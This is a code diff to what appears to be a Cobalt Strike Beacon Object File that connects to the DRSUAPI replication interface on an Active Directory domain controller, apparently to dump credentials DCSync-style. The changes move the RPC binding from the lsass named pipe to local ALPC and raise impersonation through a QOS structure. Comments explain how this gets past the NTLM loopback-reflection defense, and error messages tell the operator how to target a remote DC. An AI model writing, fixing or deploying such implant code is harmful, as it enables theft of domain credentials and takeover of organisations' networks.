@@ -132,6 +132,18 @@ typedef struct { DWORD cItems; DS_NAME_RESULT_ITEMW *rItems; } DS_NAME_RESULTW;
 #define SECPKG_ATTR_SESSION_KEY 9
 typedef struct { ULONG Len; BYTE *Key; } MY_SESSION_KEY;
 
+/* RPC security QOS — needed to raise impersonation from the default
+ * IDENTIFY (which LSA rejects for DRSUAPI) up to IMPERSONATE. */
+#define MY_RPC_C_IMP_LEVEL_IMPERSONATE  3
+#define MY_RPC_C_QOS_IDENTITY_STATIC    0
+#define MY_RPC_C_QOS_CAPABILITIES_DEFAULT 0
+typedef struct {
+    ULONG Version;
+    ULONG Capabilities;
+    ULONG IdentityTracking;
+    ULONG ImpersonationType;
+} MY_RPC_SEC_QOS;
+
 /* NDR data representation: little-endian, ASCII, IEEE */
 #define NDR_DATA_REP 0x00000010
 
@@ -1268,25 +1280,32 @@ void go(char *args, int args_len)
 
     /* ── Step 3: Create RPC binding to DRSUAPI ──
      *
-     * Bind over the named pipe \pipe\lsass (ncacn_np) rather than
-     * ncacn_ip_tcp.  Rationale for the RPC_S_UNKNOWN_IF (0x000006e4)
-     * failure this replaces:
+     * Transport = ncalrpc (Local Procedure Call over ALPC).
      *
-     *   - ncacn_ip_tcp requires an endpoint-mapper lookup (port 135)
-     *     to resolve DRSUAPI's dynamic TCP port.  When the DC's EPM
-     *     does not advertise DRSUAPI, when the dynamic port is
-     *     firewalled, or when the TCP endpoint offers only NDR64
-     *     (which our low-level MY_RPC_IF cannot present), the client
-     *     sees UNKNOWN_IF instead of a clean bind_nak.
+     * Why not ncacn_np:\pipe\lsass? On the same-host case (agent runs
+     * on the target DC), Windows' RPC runtime skips SPN lookup for
+     * the named-pipe transport and prefers NTLM. Local LSA refuses
+     * NTLM-to-itself as a loopback-reflection defense — regardless of
+     * the caller's group membership; even Domain Admins get denied —
+     * and the refusal surfaces as RPC_S_ACCESS_DENIED (0x5) at
+     * DRSBind. That's the previous failure this transport replaces.
      *
-     *   - \pipe\lsass is DRSUAPI's stable, well-known endpoint over
-     *     SMB (445), used by impacket / mimikatz / SharpKatz.  No EPM
-     *     round-trip, no dynamic-port firewall issue, and lsass
-     *     accepts NDR (2.0) which is what we advertise.
+     * ncalrpc rides ALPC and passes the caller's process token to
+     * lsass via the LPC message header — no NTLM handshake, no
+     * Kerberos ticket, no SPN lookup, no loopback-reflection block.
+     * The endpoint is dynamic (LSA registers it at boot) so we let
+     * RpcEpResolveBinding query the local endpoint mapper for the
+     * ALPC port name currently hosting DRSUAPI.
      *
-     * If the operator later needs TCP fallback (e.g. SMB is blocked),
-     * try ncacn_ip_tcp with endpoint = NULL and EpResolveBinding as
-     * a second attempt after this first bind returns UNKNOWN_IF.
+     * ntdsapi.dll's DsBindW does this exact same-host optimization
+     * internally, which is why the earlier DsBindW succeeded while
+     * the raw ncacn_np path failed with 0x5.
+     *
+     * For an off-box target (agent NOT on the DC), swap this back to
+     *   ncacn_np:aDC[\pipe\lsass]
+     * with ServerPrincName = NULL — that combination auto-derives a
+     * HOST/<fqdn> SPN, Kerberos issues a real ticket, and the
+     * loopback issue does not apply since we're actually remote.
      */
     BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: init_drsuapi_if\n");
     init_drsuapi_if();
@@ -1294,10 +1313,10 @@ void go(char *args, int args_len)
     RPC_CSTR stringBinding = NULL;
     RPC_BINDING_HANDLE hRpc = NULL;
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcStringBindingComposeA\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcStringBindingComposeA (ncalrpc)\n");
     RPC_STATUS rpcSt = RPCRT4$RpcStringBindingComposeA(
-        NULL, (RPC_CSTR)"ncacn_np", (RPC_CSTR)aDC,
-        (RPC_CSTR)"\\pipe\\lsass", NULL, &stringBinding);
+        NULL, (RPC_CSTR)"ncalrpc", NULL,
+        NULL, NULL, &stringBinding);
     BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x binding=%s\n",
                  rpcSt, stringBinding ? (char*)stringBinding : "(null)");
     if (rpcSt == 0) {
@@ -1308,31 +1327,44 @@ void go(char *args, int args_len)
         RPCRT4$RpcStringFreeA(&stringBinding);
     }
     if (rpcSt == 0) {
-        /* PKT_PRIVACY + GSS_NEGOTIATE — required by DRSUAPI's ACL.
-         * Any lower auth level makes the interface look "unknown" to
-         * the caller (Windows hides it rather than returning
-         * ACCESS_DENIED on the bind).
-         *
-         * ServerPrincName = NULL: let the RPC runtime auto-derive the
-         * SPN from the binding's target hostname. Passing a bare host
-         * name (aDC) here made SSPI unable to acquire a Kerberos
-         * service ticket, so it fell back to NTLM — and NTLM against
-         * the LOCAL LSA (agent running on the target DC itself) is
-         * rejected by the loopback-reflection defense, which is the
-         * RPC_S_ACCESS_DENIED (0x5) we were seeing at DRSBind. */
-        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA\n");
-        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
-            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE,
-            NULL, 0, NULL);
+        /* Resolve the ALPC endpoint that hosts DRSUAPI on this box.
+         * ncalrpc endpoints are dynamic, so we ask the local EPM
+         * (\RPC Control\epmapper) for the port name registered
+         * against the DRSUAPI interface UUID. Purely local call. */
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcEpResolveBinding (DRSUAPI on ncalrpc)\n");
+        rpcSt = RPCRT4$RpcEpResolveBinding(hRpc, (void*)&g_drsuapi_if);
         BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
     }
-    /* No RpcEpResolveBinding: \pipe\lsass is the endpoint.
-     * No RpcBindingBind: the first authenticated I_RpcSendReceive
-     * (DRSBind) drives the SSPI handshake and populates the security
-     * context on the binding handle. */
+    if (rpcSt == 0) {
+        /* PKT_PRIVACY is still required by the DRSUAPI ACL; over ALPC
+         * this reduces to LPC-layer sealing (nearly free).  A QOS
+         * struct raises impersonation from the default IDENTIFY to
+         * IMPERSONATE — lsass' ACL check needs to be able to open
+         * the caller's token to evaluate group membership, and
+         * IDENTIFY does not grant that. */
+        MY_RPC_SEC_QOS qos;
+        MSVCRT$memset(&qos, 0, sizeof(qos));
+        qos.Version           = 1;
+        qos.Capabilities      = MY_RPC_C_QOS_CAPABILITIES_DEFAULT;
+        qos.IdentityTracking  = MY_RPC_C_QOS_IDENTITY_STATIC;
+        qos.ImpersonationType = MY_RPC_C_IMP_LEVEL_IMPERSONATE;
+
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace: RpcBindingSetAuthInfoExA (NEGOTIATE + IMPERSONATE)\n");
+        rpcSt = RPCRT4$RpcBindingSetAuthInfoExA(hRpc, NULL,
+            RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE,
+            NULL, 0, &qos);
+        BeaconPrintf(CALLBACK_OUTPUT, "[.] trace:   rpcSt=0x%08x\n", rpcSt);
+    }
     if (rpcSt) {
         BeaconPrintf(CALLBACK_ERROR,
             "[!] RPC binding failed: 0x%08x\n", rpcSt);
+        if (rpcSt == 1753) {
+            BeaconPrintf(CALLBACK_ERROR,
+                "[!]   0x6D9 = EPT_S_NOT_REGISTERED. DRSUAPI is not\n"
+                "[!]   registered on ncalrpc here — the agent is likely\n"
+                "[!]   NOT on the DC itself. Change transport back to\n"
+                "[!]   ncacn_np:<dc_fqdn>[\\pipe\\lsass] for remote case.\n");
+        }
         if (hRpc) RPCRT4$RpcBindingFree(&hRpc);
         return;
     }
